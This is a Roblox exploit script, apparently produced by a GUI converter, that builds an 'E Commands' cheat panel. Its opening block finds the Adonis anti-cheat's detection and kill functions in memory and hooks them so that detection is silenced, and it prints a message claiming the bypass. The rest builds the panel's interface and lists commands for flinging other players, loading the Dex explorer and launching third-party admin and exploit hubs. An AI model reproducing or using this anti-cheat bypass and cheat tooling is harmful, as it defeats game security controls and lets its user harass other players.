--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 170 | Scripts: 2 | Modules: 0 | Tags: 0

task.spawn(function()
	for _, rems in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do
		if rems:IsA("RemoteEvent") and rems:FindFirstChild("__FUNCTION") then
			task.spawn(function()
				local DebugFunc = getinfo or debug.getinfo
				local IsDebug = false
				local hooks = {}
				local oglevel = getthreadidentity()

				local DetectedMeth, KillMeth

				setthreadidentity(2)

				for index, value in getgc(true) do
					if typeof(value) == "table" then
						local detected = rawget(value, "Detected")
						local kill = rawget(value, "Kill")

						if typeof(detected) == "function" and not DetectedMeth then
							DetectedMeth = detected

							local hook
							hook = hookfunction(DetectedMeth, function(methodName, methodFunc, methodInfo)
								if methodName ~= "_" then
									if IsDebug then
										print("Adonis Detected\nMethod: " .. tostring(methodName) .. "\nInfo: " .. tostring(methodFunc))
									end
								end

								return true
							end)

							table.insert(hooks, DetectedMeth)
						end

						if rawget(value, "Variables") and rawget(value, "Process") and typeof(kill) == "function" and not KillMeth then
							KillMeth = kill
							local hook
							hook = hookfunction(KillMeth, function(killFunc)
								if IsDebug then
									print("Adonis tried to detect: " .. tostring(killFunc))
								end
							end)

							table.insert(hooks, KillMeth)
						end
					end
				end

				local hook
				hook = hookfunction(getrenv().debug.info, newcclosure(function(...)
					local functionName, functionDetails = ...

					if DetectedMeth and functionName == DetectedMeth then
						if IsDebug or not IsDebug then
							print("Adonis was bypassed by the_king.78")
						end

						return coroutine.yield(coroutine.running())
					end

					return hook(...)
				end))

				setthreadidentity(oglevel)
			end)
		end
	end
end)

local G2L = {};

-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh
G2L["1"] = Instance.new("ScreenGui", gethui and gethui() or game:GetService("CoreGui"));
G2L["1"]["DisplayOrder"] = 2147483647;
G2L["1"]["Name"] = [[GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh]];
G2L["1"]["ResetOnSpawn"] = false;


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["ZIndex"] = 2147483647;
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["2"]["Size"] = UDim2.new(0.25199, 0, 0.1877, 0);
G2L["2"]["Position"] = UDim2.new(0.74777, 0, 0.53332, 0);
G2L["2"]["Name"] = [[MainFrame]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Input
G2L["3"] = Instance.new("TextBox", G2L["2"]);
G2L["3"]["Name"] = [[Input]];
G2L["3"]["PlaceholderColor3"] = Color3.fromRGB(0, 114, 167);
G2L["3"]["ZIndex"] = 2147483647;
G2L["3"]["BorderSizePixel"] = 0;
G2L["3"]["TextWrapped"] = true;
G2L["3"]["TextSize"] = 14;
G2L["3"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["3"]["TextScaled"] = true;
G2L["3"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
G2L["3"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3"]["ClearTextOnFocus"] = false;
G2L["3"]["PlaceholderText"] = [[E Commands - Put Command Here And Press Enter]];
G2L["3"]["Size"] = UDim2.new(0.95253, 0, 0.30252, 0);
G2L["3"]["Position"] = UDim2.new(0.02215, 0, 0.05882, 0);
G2L["3"]["Text"] = [[]];
G2L["3"]["BackgroundTransparency"] = 0.5;


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Input.UICorner
G2L["4"] = Instance.new("UICorner", G2L["3"]);



-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Input.UIStroke
G2L["5"] = Instance.new("UIStroke", G2L["3"]);
G2L["5"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["5"]["Color"] = Color3.fromRGB(0, 171, 255);


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.UICorner
G2L["6"] = Instance.new("UICorner", G2L["2"]);



-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Line
G2L["7"] = Instance.new("Frame", G2L["2"]);
G2L["7"]["ZIndex"] = 2147483647;
G2L["7"]["BackgroundColor3"] = Color3.fromRGB(0, 171, 255);
G2L["7"]["Size"] = UDim2.new(0.95253, 0, 0.01681, 0);
G2L["7"]["Position"] = UDim2.new(0.02215, 0, 0.43697, 0);
G2L["7"]["Name"] = [[Line]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Output
G2L["8"] = Instance.new("TextLabel", G2L["2"]);
G2L["8"]["TextWrapped"] = true;
G2L["8"]["ZIndex"] = 2147483647;
G2L["8"]["BorderSizePixel"] = 0;
G2L["8"]["TextSize"] = 14;
G2L["8"]["TextScaled"] = true;
G2L["8"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
G2L["8"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["8"]["BackgroundTransparency"] = 0.5;
G2L["8"]["Size"] = UDim2.new(0.95253, 0, 0.42017, 0);
G2L["8"]["Text"] = [[]];
G2L["8"]["Name"] = [[Output]];
G2L["8"]["Position"] = UDim2.new(0.02215, 0, 0.51261, 0);


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Output.UIStroke
G2L["9"] = Instance.new("UIStroke", G2L["8"]);
G2L["9"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["9"]["Color"] = Color3.fromRGB(0, 171, 255);


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Output.UICorner
G2L["a"] = Instance.new("UICorner", G2L["8"]);



-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.UIDragDetector
G2L["b"] = Instance.new("UIDragDetector", G2L["2"]);



-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Main
G2L["c"] = Instance.new("LocalScript", G2L["2"]);
G2L["c"]["Name"] = [[Main]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame
G2L["d"] = Instance.new("Frame", G2L["1"]);
G2L["d"]["Visible"] = false;
G2L["d"]["ZIndex"] = 2147483647;
G2L["d"]["BackgroundColor3"] = Color3.fromRGB(48, 48, 48);
G2L["d"]["Size"] = UDim2.new(0.1965, 0, 0.41798, 0);
G2L["d"]["Position"] = UDim2.new(0.09118, 0, 0.33139, 0);
G2L["d"]["Name"] = [[CmdFrame]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.UICorner
G2L["e"] = Instance.new("UICorner", G2L["d"]);



-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Title
G2L["f"] = Instance.new("TextLabel", G2L["d"]);
G2L["f"]["TextWrapped"] = true;
G2L["f"]["ZIndex"] = 2147483647;
G2L["f"]["TextSize"] = 14;
G2L["f"]["TextScaled"] = true;
G2L["f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["f"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["f"]["BackgroundTransparency"] = 1;
G2L["f"]["Size"] = UDim2.new(0.91905, 0, 0.1283, 0);
G2L["f"]["Text"] = [[E Commands List]];
G2L["f"]["Name"] = [[Title]];
G2L["f"]["Position"] = UDim2.new(0.04286, 0, 0, 0);


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame
G2L["10"] = Instance.new("Frame", G2L["d"]);
G2L["10"]["ZIndex"] = 2147483647;
G2L["10"]["BorderSizePixel"] = 0;
G2L["10"]["BackgroundColor3"] = Color3.fromRGB(39, 39, 39);
G2L["10"]["Size"] = UDim2.new(0.94056, 0, 0.79623, 0);
G2L["10"]["Position"] = UDim2.new(0.03165, 0, 0.16912, 0);


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll
G2L["11"] = Instance.new("ScrollingFrame", G2L["10"]);
G2L["11"]["Active"] = true;
G2L["11"]["ZIndex"] = 2147483647;
G2L["11"]["BorderSizePixel"] = 0;
G2L["11"]["CanvasSize"] = UDim2.new(0, 0, 30, 0);
G2L["11"]["BackgroundColor3"] = Color3.fromRGB(39, 39, 39);
G2L["11"]["Name"] = [[CmdScroll]];
G2L["11"]["Size"] = UDim2.new(1, 0, 0.99687, 0);
G2L["11"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11"]["Position"] = UDim2.new(0, 0, 0.00313, 0);
G2L["11"]["BackgroundTransparency"] = 1;


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.UIListLayout
G2L["12"] = Instance.new("UIListLayout", G2L["11"]);



-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >dex
G2L["13"] = Instance.new("TextButton", G2L["11"]);
G2L["13"]["TextWrapped"] = true;
G2L["13"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["13"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["13"]["TextSize"] = 14;
G2L["13"]["TextScaled"] = true;
G2L["13"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["13"]["ZIndex"] = 2147483647;
G2L["13"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["13"]["BackgroundTransparency"] = 1;
G2L["13"]["Name"] = [[ >dex]];
G2L["13"]["Text"] = [[ >dex]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >dex.Info
G2L["14"] = Instance.new("StringValue", G2L["13"]);
G2L["14"]["Name"] = [[Info]];
G2L["14"]["Value"] = [[Command Info: Dex let's you see every instance in the game. (well not every idk why I said every) (some executors may crash when loading this idk for sure though since this is the bypassed version which uses a ton of methods)]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >punch
G2L["15"] = Instance.new("TextButton", G2L["11"]);
G2L["15"]["TextWrapped"] = true;
G2L["15"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["15"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["15"]["TextSize"] = 14;
G2L["15"]["TextScaled"] = true;
G2L["15"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["15"]["ZIndex"] = 2147483647;
G2L["15"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["15"]["BackgroundTransparency"] = 1;
G2L["15"]["Name"] = [[ >punch]];
G2L["15"]["Text"] = [[ >punch]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >punch.Info
G2L["16"] = Instance.new("StringValue", G2L["15"]);
G2L["16"]["Name"] = [[Info]];
G2L["16"]["Value"] = [[Command Info: Press K to punch. (It flings people + no cooldown) (Mobile users should use a mobile keyboard script)]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >iy
G2L["17"] = Instance.new("TextButton", G2L["11"]);
G2L["17"]["TextWrapped"] = true;
G2L["17"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["17"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["17"]["TextSize"] = 14;
G2L["17"]["TextScaled"] = true;
G2L["17"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["17"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["17"]["ZIndex"] = 2147483647;
G2L["17"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["17"]["BackgroundTransparency"] = 1;
G2L["17"]["Name"] = [[ >iy]];
G2L["17"]["Text"] = [[ >iy]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >iy.Info
G2L["18"] = Instance.new("StringValue", G2L["17"]);
G2L["18"]["Name"] = [[Info]];
G2L["18"]["Value"] = [[Command Info: Executes the popular admin script, Infinite Yield.]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >cmdx
G2L["19"] = Instance.new("TextButton", G2L["11"]);
G2L["19"]["TextWrapped"] = true;
G2L["19"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["19"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["19"]["TextSize"] = 14;
G2L["19"]["TextScaled"] = true;
G2L["19"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["19"]["ZIndex"] = 2147483647;
G2L["19"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["19"]["BackgroundTransparency"] = 1;
G2L["19"]["Name"] = [[ >cmdx]];
G2L["19"]["Text"] = [[ >cmdx]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >cmdx.Info
G2L["1a"] = Instance.new("StringValue", G2L["19"]);
G2L["1a"]["Name"] = [[Info]];
G2L["1a"]["Value"] = [[Command Info: Another popular admin script called CMD X.]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >cmds
G2L["1b"] = Instance.new("TextButton", G2L["11"]);
G2L["1b"]["TextWrapped"] = true;
G2L["1b"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["1b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["1b"]["TextSize"] = 14;
G2L["1b"]["TextScaled"] = true;
G2L["1b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1b"]["ZIndex"] = 2147483647;
G2L["1b"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["1b"]["BackgroundTransparency"] = 1;
G2L["1b"]["Name"] = [[ >cmds]];
G2L["1b"]["Text"] = [[ >cmds]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >cmds.Info
G2L["1c"] = Instance.new("StringValue", G2L["1b"]);
G2L["1c"]["Name"] = [[Info]];
G2L["1c"]["Value"] = [[Command Info: Opens the Commands List]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >uncmds
G2L["1d"] = Instance.new("TextButton", G2L["11"]);
G2L["1d"]["TextWrapped"] = true;
G2L["1d"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["1d"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["1d"]["TextSize"] = 14;
G2L["1d"]["TextScaled"] = true;
G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1d"]["ZIndex"] = 2147483647;
G2L["1d"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["1d"]["BackgroundTransparency"] = 1;
G2L["1d"]["Name"] = [[ >uncmds]];
G2L["1d"]["Text"] = [[ >uncmds]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >uncmds.Info
G2L["1e"] = Instance.new("StringValue", G2L["1d"]);
G2L["1e"]["Name"] = [[Info]];
G2L["1e"]["Value"] = [[Command Info: Closes the Command List]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >spinfling
G2L["1f"] = Instance.new("TextButton", G2L["11"]);
G2L["1f"]["TextWrapped"] = true;
G2L["1f"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["1f"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["1f"]["TextSize"] = 14;
G2L["1f"]["TextScaled"] = true;
G2L["1f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1f"]["ZIndex"] = 2147483647;
G2L["1f"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["1f"]["BackgroundTransparency"] = 1;
G2L["1f"]["Name"] = [[ >spinfling]];
G2L["1f"]["Text"] = [[ >spinfling]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >spinfling.Info
G2L["20"] = Instance.new("StringValue", G2L["1f"]);
G2L["20"]["Name"] = [[Info]];
G2L["20"]["Value"] = [[Command Info: Spins you very fast with velocity that you fling people.]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >unspinfling
G2L["21"] = Instance.new("TextButton", G2L["11"]);
G2L["21"]["TextWrapped"] = true;
G2L["21"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["21"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["21"]["TextSize"] = 14;
G2L["21"]["TextScaled"] = true;
G2L["21"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["21"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["21"]["ZIndex"] = 2147483647;
G2L["21"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["21"]["BackgroundTransparency"] = 1;
G2L["21"]["Name"] = [[ >unspinfling]];
G2L["21"]["Text"] = [[ >unspinfling]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >unspinfling.Info
G2L["22"] = Instance.new("StringValue", G2L["21"]);
G2L["22"]["Name"] = [[Info]];
G2L["22"]["Value"] = [[Command Info: This turns off Spin Fling]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >fling/<player name>
G2L["23"] = Instance.new("TextButton", G2L["11"]);
G2L["23"]["TextWrapped"] = true;
G2L["23"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["23"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["23"]["TextSize"] = 14;
G2L["23"]["TextScaled"] = true;
G2L["23"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["23"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["23"]["ZIndex"] = 2147483647;
G2L["23"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["23"]["BackgroundTransparency"] = 1;
G2L["23"]["Name"] = [[ >fling/<player name>]];
G2L["23"]["Text"] = [[ >fling/<player name>]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >fling/<player name>.Info
G2L["24"] = Instance.new("StringValue", G2L["23"]);
G2L["24"]["Name"] = [[Info]];
G2L["24"]["Value"] = [[Command Info: Does not require a tool unlike others.]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >noclipfling/<player name>
G2L["25"] = Instance.new("TextButton", G2L["11"]);
G2L["25"]["TextWrapped"] = true;
G2L["25"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["25"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["25"]["TextSize"] = 14;
G2L["25"]["TextScaled"] = true;
G2L["25"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["25"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["25"]["ZIndex"] = 2147483647;
G2L["25"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["25"]["BackgroundTransparency"] = 1;
G2L["25"]["Name"] = [[ >noclipfling/<player name>]];
G2L["25"]["Text"] = [[ >noclipfling/<player name>]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >noclipfling/<player name>.Info
G2L["26"] = Instance.new("StringValue", G2L["25"]);
G2L["26"]["Name"] = [[Info]];
G2L["26"]["Value"] = [[Command Info: Flings people who have noclip on. (not anti fling)]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >expandchat
G2L["27"] = Instance.new("TextButton", G2L["11"]);
G2L["27"]["TextWrapped"] = true;
G2L["27"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["27"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["27"]["TextSize"] = 14;
G2L["27"]["TextScaled"] = true;
G2L["27"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["27"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["27"]["ZIndex"] = 2147483647;
G2L["27"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["27"]["BackgroundTransparency"] = 1;
G2L["27"]["Name"] = [[ >expandchat]];
G2L["27"]["Text"] = [[ >expandchat]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >expandchat.Info
G2L["28"] = Instance.new("StringValue", G2L["27"]);
G2L["28"]["Name"] = [[Info]];
G2L["28"]["Value"] = [[Command Info: Let's you be able to resize the chat + drag it.]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >unglitchaudio
G2L["29"] = Instance.new("TextButton", G2L["11"]);
G2L["29"]["TextWrapped"] = true;
G2L["29"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["29"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["29"]["TextSize"] = 14;
G2L["29"]["TextScaled"] = true;
G2L["29"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["29"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["29"]["ZIndex"] = 2147483647;
G2L["29"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["29"]["BackgroundTransparency"] = 1;
G2L["29"]["Name"] = [[ >unglitchaudio]];
G2L["29"]["Text"] = [[>unglitchaudio]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >unglitchaudio.Info
G2L["2a"] = Instance.new("StringValue", G2L["29"]);
G2L["2a"]["Name"] = [[Info]];
G2L["2a"]["Value"] = [[Command Info: Added the missing command for disabling glitched boombox on everyone]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >eclipsehub/<Premium key or 'nil'>
G2L["2b"] = Instance.new("TextButton", G2L["11"]);
G2L["2b"]["TextWrapped"] = true;
G2L["2b"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["2b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["2b"]["TextSize"] = 14;
G2L["2b"]["TextScaled"] = true;
G2L["2b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2b"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2b"]["ZIndex"] = 2147483647;
G2L["2b"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
G2L["2b"]["BackgroundTransparency"] = 1;
G2L["2b"]["Name"] = [[ >eclipsehub/<Premium key or 'nil'>]];
G2L["2b"]["Text"] = [[ >eclipsehub/<Premium key or 'nil'>]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >eclipsehub/<Premium key or 'nil'>.Info
G2L["2c"] = Instance.new("StringValue", G2L["2b"]);
G2L["2c"]["Name"] = [[Info]];
G2L["2c"]["Value"] = [[Command Info: Eclipse Hub has a lot for Murder Mystery 2 which is what I mostly use it for. (optional premium key argument BUT you have to put 'nil' if you don't have one)]];


-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >muteradio/<player name>
G2L["2d"] = Instance.new("TextButton", G2L["11"]);
G2L["2d"]["TextWrapped"] = true;
G2L["2d"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
G2L["2d"]["TextXAlignment"] = Enum.TextXAlignment.Left;
